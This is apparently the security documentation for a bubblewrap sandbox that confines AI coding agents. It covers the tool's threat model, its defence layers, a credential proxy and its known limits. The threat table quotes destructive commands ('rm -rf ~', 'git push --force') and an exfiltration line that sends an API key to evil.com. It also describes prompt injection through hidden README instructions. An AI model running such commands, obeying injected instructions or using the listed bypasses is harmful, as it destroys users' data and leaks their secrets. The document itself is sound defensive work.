# Security Model

## Threat Model

The sandbox protects your **host machine from the agent**, not secrets from the agent. The agent still has its own API key (it needs one to function) and can see whatever MCP server credentials are in its config. The sandbox is **not** a defense against a compromised agent binary or a kernel-level exploit -- for that, use a VM.

Four threat categories, ordered by likelihood:

| Category | Description | Example |
|----------|-------------|---------|
| **Prompt injection** | Malicious code in a repository triggers destructive commands | A repo's README contains hidden instructions that cause the agent to `rm -rf ~` |
| **Hallucination** | The agent generates dangerous commands from a plausible but incorrect reasoning chain | `git push --force origin main` or `rm -rf /` from a confused model |
| **Accidental damage** | Overly broad file operations that spill outside the project | A bulk rename that touches sibling directories |
| **API key exfiltration** | A prompt-injected agent extracts API keys from environment variables or config files and sends them to an attacker | `curl https://evil.com/?key=$ANTHROPIC_API_KEY` |

---

## Defense Layers

Nine layers of defense, most enabled by default:

| Layer | Feature | Default |
|-------|---------|---------|
| Filesystem isolation | Read-only root, tmpfs home | Always on |
| PID namespace | Host processes invisible to sandbox | On |
| Env var clearing | Only whitelisted vars pass through | Always on |
| Git push blocking | Wrapper script + sanitized gitconfig | On |
| Credential proxy | API keys never enter sandbox | Opt-in |
| Cloud SSRF blocking | Metadata endpoints blocked by proxy | On (when proxy enabled) |
| Config snapshots | Auto-snapshot before each run | On |
| Project snapshots | Snapshot writable project directory | Opt-in |
| Learn mode | Discover actual access needs via strace | On-demand |

---

## What It Blocks

| Attack Vector | Protection | How |
|---------------|------------|-----|
| File deletion/modification | Entire filesystem read-only except project dir | `--ro-bind / /` + `--tmpfs $HOME` |
| SSH key theft | `~/.ssh` does not exist inside sandbox | Hidden by tmpfs overlay on `$HOME` |
| Cloud credential theft | `~/.aws`, `~/.config/gcloud`, etc. invisible | Hidden by tmpfs overlay on `$HOME` |
| Git push | Blocked at three layers | Wrapper script + sanitized `.gitconfig` + no credential helpers |
| API key exfiltration | Credential proxy keeps keys outside sandbox | Reverse proxy injects headers; keys never enter sandbox env |
| Cloud SSRF | Metadata endpoints blocked | Proxy blocks `169.254.169.254`, `metadata.google.internal`, etc. |
| Environment variable leaks | Only whitelisted vars pass through | `--clearenv` + explicit `--setenv` |
| Process killing/inspection | Host processes invisible | `--unshare-pid` (PID namespace) |
| System modification | Cannot write to `/usr`, `/etc`, `/var` | Read-only root filesystem |
| DBus/desktop access | Session bus socket hidden | `--tmpfs /run` |
| X11/Wayland keylogging | Display sockets hidden | `--tmpfs /tmp` |
| Cron/systemd persistence | Cannot create services or cron jobs | Read-only `/etc`, tmpfs `/run` |

---

## What It Allows

| Capability | Why | How |
|------------|-----|-----|
| Read/write project directory | Agent needs to edit your code | `--bind $PWD $PWD` (writable) |
| Read other projects | Agent may reference sibling repos | `--ro-bind ~/project ~/project` (configurable) |
| Network access | Needed for API calls, pip, npm, git clone | No `--unshare-net` |
| Build tools | python, node, cargo, make, gcc, etc. | System dirs read-only + `$HOME` PATH dirs auto-detected (including deep subdirectories) |
| Agent config | Settings, MCP servers, skills | Isolated copy in `~/.agent-sandbox/claude-config` |
| Package caches | cargo, npm, go can download dependencies | Persistent writable dirs for registry/cache subdirectories |
| Filesystem snapshots | Undo agent damage to project or config | rsync hardlink-based snapshots with interactive restore |

---

## How It Works

agent-sandbox builds a [bubblewrap](https://github.com/containers/bubblewrap) command that creates a Linux mount namespace -- a "view" of the filesystem where most paths are read-only, and `$HOME` is replaced by a fresh tmpfs with selective bind mounts.

```
/                           read-only   (entire OS visible but unmodifiable)
├── /tmp                    fresh tmpfs (empty, writable, isolated)
├── /run                    fresh tmpfs (hides DBus, Wayland sockets)
├── /dev                    minimal     (null, zero, random only)
├── /proc                   namespaced  (only sandbox processes visible)
└── /home/you               tmpfs       (entire home hidden)
    ├── .ssh                GONE        (does not exist)
    ├── .aws                GONE
    ├── .gnupg              GONE
    ├── .gitconfig          sanitized   (read-only, no credential helpers)
    ├── .claude/            SANDBOX     (writable isolated copy)
    ├── .local/             read-only   (auto-detected from PATH)
    ├── .cargo/             read-only   (binaries), writable (registry cache)
    ├── project/            read-only   (sibling repos visible)
    │   └── myrepo/         WRITABLE    (your current project)
    └── ...other PATH dirs  read-only   (auto-detected, deep subdirs included)
```

Environment variables are cleared (`--clearenv`) and only an explicit whitelist is injected. This prevents leaking `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, or any other secret from your shell.

---

## Git Push Blocking

Git push is blocked at three independent layers:

1. **Wrapper script** -- a `git` wrapper placed first in `$PATH` intercepts `git push` and returns an error before the real git binary runs.
2. **Sanitized gitconfig** -- the `.gitconfig` mounted inside the sandbox has all `[credential]` sections and `[url "..."]` rewrite rules stripped.
3. **No credential helpers** -- without credential helpers or SSH keys, any push that bypasses the wrapper fails authentication anyway.

The `push.default` git option is forced to `nothing`, so even a bare `git push` does nothing.

---

## Credential Proxy

The credential proxy keeps API keys outside the sandbox entirely. Instead of passing `ANTHROPIC_API_KEY` into the sandbox environment, a localhost HTTP proxy runs on the host, intercepts API calls, and injects the correct authentication header. A prompt-injected agent cannot exfiltrate the key because it never exists in the sandbox's memory.

Enable it in `config.toml`:

```toml
[security]
credential_proxy = true
```

### How it works

1. The proxy starts on a random localhost port before the sandbox launches.
2. The agent's `*_BASE_URL` env var is rewritten to `http://localhost:PORT`.
3. The agent SDK sends requests to the local proxy.
4. The proxy injects the real API key header and forwards to the upstream API over HTTPS.
5. Non-API traffic (package managers, git clone) passes through via CONNECT tunneling without credential injection.

### Env-var-to-domain mapping

| Env Var | API Domain | Header |
|---------|------------|--------|
| `ANTHROPIC_API_KEY` | `api.anthropic.com` | `x-api-key` |
| `ANTHROPIC_AUTH_TOKEN` | `api.anthropic.com` | `Authorization: Bearer` |
| `OPENAI_API_KEY` | `api.openai.com` | `Authorization: Bearer` |
| `GOOGLE_API_KEY` | `generativelanguage.googleapis.com` | `x-goog-api-key` |
| `GEMINI_API_KEY` | `generativelanguage.googleapis.com` | `x-goog-api-key` |

### SSRF blocking

Cloud metadata endpoints are always blocked when the proxy is enabled:

- `169.254.169.254`
- `metadata.google.internal`
- `metadata.azure.internal`

Additional hosts can be blocked via `[credential_proxy].blocked_hosts`.

---

## Environment Variable Isolation

All host environment variables are stripped with `--clearenv`. Only two sources of variables enter the sandbox:

1. **`[env].passthrough`** -- an explicit whitelist of host vars (terminal settings, locale). API keys should never be listed here.
2. **Profile `env` sections** -- provider credentials and settings injected via `--setenv`. These do not need to exist in the host shell.

Static variables can also be set via `[env.extra]` for every run regardless of profile.

---

## What This Does NOT Protect Against

| Limitation | Details |
|------------|---------|
| **Network is open** | Without the credential proxy, the agent can make outbound HTTP requests. This is necessary for API calls, package managers, and git clone. A prompt injection could exfiltrate project source code over the network. Enable `credential_proxy = true` to at least block API key exfiltration and cloud SSRF |
| **Git push bypass** | The agent could call `/usr/bin/git push` directly, bypassing the wrapper. However, without SSH keys or credential helpers, authentication fails. The wrapper is defense-in-depth |
| **Not a VM** | bubblewrap uses Linux namespaces, a kernel feature. A kernel vulnerability in namespace handling could theoretically allow escape. For higher assurance, run the sandbox inside a VM |
| **Linux only** | agent-sandbox requires bubblewrap, which depends on Linux kernel namespaces. macOS users can use the [nono](https://github.com/always-further/nono) backend (Landlock/Seatbelt) |
| **MCP server secrets** | If `~/.claude/settings.json` contains API keys in MCP server env vars, those are copied to the sandbox. Review `~/.agent-sandbox/claude-config/settings.json` after init. With `credential_proxy = true`, profile API keys stay outside the sandbox |
| **Tmpfs home is writable** | The `$HOME` tmpfs overlay is writable (that is how tmpfs works). The agent can create temporary files like `~/temp.txt`, but they are ephemeral and vanish when the sandbox exits. They never touch your real home directory |
| **Credential proxy and HTTPS** | The proxy rewrites `*_BASE_URL` to `http://localhost:PORT`. All major AI SDKs support base URL overrides, so this is transparent. Custom HTTP clients that ignore `*_BASE_URL` env vars will not benefit from the proxy |
| **Learn mode accuracy** | `strace` captures actual I/O but may miss paths checked with `access()` or `stat()` without opening. The learn sandbox is permissive, so the agent may access paths blocked in the real sandbox. Use the report as guidance, not as an exhaustive spec |
| **Snapshot disk usage** | Snapshots use hardlinks for deduplication but still consume disk for changed files. Monitor with `agent-sandbox snapshot-list` and configure `max_project_snapshots` / `max_config_snapshots` |

---

## Build Tools Inside the Sandbox

Build tools work with minimal friction because system directories are read-only and package caches are redirected to persistent writable directories.

| Tool | How it works |
|------|-------------|
| **pip** | Use a virtual environment inside the project directory. The venv is writable, so `pip install` works normally |
| **npm** | `node_modules/` is created in the project directory. The npm download cache is redirected to `~/.agent-sandbox/toolchains/npm-cache/` |
| **cargo** | Binaries under `~/.cargo/bin/` are available read-only. Registry and git caches are mounted writable from `~/.agent-sandbox/toolchains/cargo/`. `cargo install` of new tools will fail (read-only binaries) |
| **go** | `GOPATH` and `GOMODCACHE` are redirected to `~/.agent-sandbox/toolchains/go/`. `go build` and `go mod download` work normally |
| **System tools** | Everything in `/usr/bin`, `/usr/local/bin`, etc. is available read-only. Tools installed under `$HOME` (nvm, pyenv, sdkman) are auto-detected from `$PATH` and exposed read-only |

---

## See Also

- [CLI Reference](sandbox/cli-reference.md) -- command synopsis, flags, and usage examples
- [Configuration Reference](sandbox/config-reference.md) -- every TOML key documented
- [Cheatsheet](https://github.com/RisorseArtificiali/lince/blob/main/sandbox/CHEATSHEET.md) -- quick-reference card
